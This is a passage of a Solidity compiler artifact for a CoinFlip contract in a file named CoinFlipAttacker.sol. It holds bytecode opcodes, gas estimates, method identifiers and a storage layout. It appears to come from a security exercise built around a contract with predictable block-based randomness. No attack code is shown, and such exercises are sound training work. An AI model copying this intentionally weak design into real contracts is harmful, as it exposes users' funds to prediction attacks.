POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x350 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD7 0x4F 0xC4 0x5C GASLIMIT PUSH20 0xC64C77FFCC7C1D298B625B36505FA39C1C1448EF PUSH28 0x4C37BDFA6A64736F6C634300060C0033000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "183200",
						"executionCost": "25246",
						"totalCost": "208446"
					},
					"external": {
						"consecutiveWins()": "1005",
						"flip(bool)": "infinite"
					}
				},
				"methodIdentifiers": {
					"consecutiveWins()": "e6f334d7",
					"flip(bool)": "1d263f67"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
						"label": "consecutiveWins",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 9,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
						"label": "lastHash",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 12,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlip",
						"label": "FACTOR",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}